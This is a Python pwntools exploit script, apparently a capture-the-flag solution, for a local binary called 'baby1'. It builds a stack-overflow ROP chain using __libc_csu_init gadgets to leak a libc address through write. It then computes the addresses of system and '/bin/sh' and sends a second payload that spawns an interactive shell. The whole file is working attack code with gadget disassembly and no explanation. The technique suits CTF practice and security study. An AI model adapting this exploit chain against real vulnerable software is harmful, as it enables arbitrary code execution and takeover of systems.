#!/usr/bin/python

from pwn import *

r = process("./baby1")

pause()

libc = ELF("libc")

__init = 0x600e40
poprdi = 0x04006c3
__libc_csu_gadgets = 0x004006ba
writePLT = 0x4004b0
readGOT = 0x601020

def csu_payload(rbx, rbp, r12, r13, r14, r15):
	"""
	|           0x004006ba    5b           pop rbx
	|           0x004006bb    5d           pop rbp
	|           0x004006bc    415c         pop r12
	|           0x004006be    415d         pop r13
	|           0x004006c0    415e         pop r14
	|           0x004006c2    415f         pop r15
	            0x004006c4    c3           ret
	"""

	"""
	|      .--> 0x004006a0    4c89ea       mov rdx, r13
	|      ||   0x004006a3    4c89f6       mov rsi, r14
	|      ||   0x004006a6    4489ff       mov edi, r15d
	|      ||   0x004006a9    41ff14dc     call qword [r12+rbx*8] ; (fcn.00400656)
	|      ||      fcn.00400656() ; sym.__libc_csu_init+77
	|      ||   ; CODE (CALL) XREF from 0x004006a9 (fcn.00400656)
	|      ||   0x004006ad    4883c301     add rbx, 0x1
	|      ||   0x004006b1    4839eb       cmp rbx, rbp
	|      `==< 0x004006b4    75ea         jnz 0x4006a0
	|       `-> 0x004006b6    4883c408     add rsp, 0x8

	"""

	"""

	gdb-peda$ x/2gx &_DYNAMIC
	0x600e28:	0x0000000000000001	0x0000000000000001
	gdb-peda$
	0x600e38:	0x000000000000000c	0x0000000000400478

	"""


	payload = "A"*56
	payload += p64(__libc_csu_gadgets)
	payload += p64(rbx) 
	payload += p64(rbp) 
	payload += p64(r12)
	payload += p64(r13) #RDX (count)
	payload += p64(r14) #RSI (buffer)
	payload += p64(r15)
	return payload



payload = csu_payload(0x0,0x1,__init,0x8,readGOT,0x0)
payload += p64(0x004006a0) #second_shot (MOVs)
payload += p64(0x0)*7
payload += p64(poprdi) + p64(0x1)
payload += p64(writePLT)

payload += p64(0x4005f6) #main


r.recv()
r.sendline(payload)

LIBC_LEAK = u64(r.recv(8))
LIBC_BASE = LIBC_LEAK - libc.symbols['read']
LIBC_SYSTEM = LIBC_BASE + libc.symbols['system']
LIBC_BINSH = LIBC_BASE + libc.search("/bin/sh").next()


print "[+] LIBC BASE : ",hex(LIBC_BASE)

payload = "B"*56
payload += p64(poprdi)
payload += p64(LIBC_BINSH)
payload += p64(LIBC_SYSTEM)

r.recv()
r.sendline(payload)
r.interactive()
